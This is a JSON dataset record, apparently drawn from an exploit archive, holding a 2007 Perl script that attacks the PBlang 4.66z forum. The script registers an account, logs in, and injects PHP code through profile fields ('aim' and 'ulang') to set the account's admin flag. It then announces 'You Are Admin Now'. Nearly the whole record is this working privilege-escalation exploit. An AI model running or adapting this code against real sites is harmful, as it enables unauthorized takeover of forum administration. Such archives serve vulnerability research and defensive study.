{
  "id": "3569",
  "title": "PBlang 4.66z - Remote Create Admin",
  "cve": null,
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n# PBlang 4.66z Create Admin Exploit\r\n# this exploit *register* a user with admin access\r\n### Coded & Discovered By Hessam-x / Hessamx-at-Hessamx.net\r\n\r\nuse IO::Socket;\r\nuse LWP::UserAgent;\r\nuse HTTP::Cookies;\r\n\r\n\r\n $host = $ARGV[0];\r\n $uname = $ARGV[1];\r\n $passwd = $ARGV[2];\r\n $url = \"http://\".$host;\r\n\r\n print q(\r\n ###########################################################\r\n #            PBLANG 4.66z Create Admin Exploit            #\r\n #                    www.Hessamx.Net                      #\r\n ################# (C)oded By Hessam-x #####################\r\n\r\n);\r\n\r\n\r\n\r\n if (@ARGV < 3) {\r\n print \" #  usage : xpl.pl [host&path] [uname] [pass]\\n\";\r\n print \" #  e.g : xpl.pl www.milw0rm.com/pblang/ str0ke 123456\\n\";\r\n exit();\r\n }\r\n\r\n   print \" [~] User/Password : $uname/$passwd \\n\";\r\n   print \" [~] Host : $host \\n\";\r\n\r\n $evilcode  = \" \\$userlocation=\\\"hell\\\"; \\$userjoined=\\\"1174733561\\\"; \\$userhomepage=\\\"http://\\\";\";\r\n $evilcode .= \" \\$useradmin=\\\"1\\\"; \\$usermod=\\\"0\\\"; \\$userban=\\\"0\\\"; \\$userlastvisit=\\\"1174733561\\\";\";\r\n $evilcode .= \" \\$userlastpost=\\\"1174733561\\\"; \\$userprevvisit=\\\"1174733561\\\"; \\$useranimsmilies=\\\"\\\"; \\$lastaliaschange=\\\"1174733549\\\"; /*\";\r\n\r\n $xpl = LWP::UserAgent->new() or die;\r\n $cookie_jar = HTTP::Cookies->new();\r\n\r\n $xpl->cookie_jar( $cookie_jar );\r\n\r\n   #register\r\n $reg = $xpl->post($url.'register.php?reg=2',\r\n Content => [\r\n \"user\" => $uname,\r\n \"pass\" => $passwd,\r\n \"pass2\" => $passwd,\r\n \"em\" => 'evil@hell.com',\r\n \"realname\" => 'evilcode',\r\n \"alias\" => $uname,\r\n \"msn\" => 'evilcode',\r\n \"icq\" => 'evilcode',\r\n \"aim\" => 'evilcode',\r\n \"yahoo\" => 'evilcode',\r\n \"qq\" => 'evilcode',\r\n \"web\" => 'http://',\r\n \"loc\" => 'hell',\r\n \"pt\" => 'PBLang',\r\n \"av\" => 'none',\r\n \"webav\" =>'',\r\n \"sig\" => 'be Safe',\r\n \"regcode\" => '9999999999',\r\n \"lang\" => 'en',\r\n \"accept\" => '1',\r\n \"Submit\" => 'Submit',\r\n ],);\r\n   print \" [~] registered ... \\n\";\r\n\r\n$login = $xpl->post($url.'login.php?id=2',\r\nContent => [\r\n'user' => $uname,\r\n'pass' => $passwd,\r\n'Submit' => 'submit',\r\n],);\r\n$setcookie = $xpl->post($url.'setcookie.php?u='.$uname);\r\n if($cookie_jar->as_string =~ /$uname/) {\r\n   print \" [~] Logined ... \\n\";\r\n } else {\r\n print \" [-] Can not Login In $host !\\n\";\r\n exit();\r\n }\r\n $ecode = $xpl->post($url.'ucp.php?id=2&user='.$uname,\r\n Content => [\r\n \"npass\" => $passwd,\r\n \"npass2\" => $passwd,\r\n \"oldpass\" => $passwd,\r\n \"emhide\" => 'hide',\r\n \"user\" => $uname,\r\n \"em\" => 'evil@hell.com',\r\n \"realname\" => 'evilcode',\r\n \"alias\" => $uname,\r\n \"msn\" => 'evilcode',\r\n \"icq\" => 'evilcode',\r\n \"aim\" => 'evilcode\\\";'.$evilcode,\r\n \"yah\" => 'evilcode',\r\n \"qq\" => 'evilcode',\r\n \"web\" => 'http://',\r\n \"loc\" => 'hell',\r\n \"pt\" => 'PBLang',\r\n \"av\" => 'none',\r\n \"webav\" =>'',\r\n \"sig\" => '',\r\n \"regcode\" => '1174733482',\r\n \"ulang\" => '*/ \\$userlang=\\\"en\\\"; //',\r\n \"accept\" => '1',\r\n \"Submit2\" => 'Submit',\r\n ],);\r\n\r\n\r\nprint \" [+] You Are Admin Now !!\";\r\nprint \"\\n #################################################### \\n\";\r\n\r\n# milw0rm.com [2007-03-25]",
  "url": "https://www.exploit-db.com/exploits/3569"
}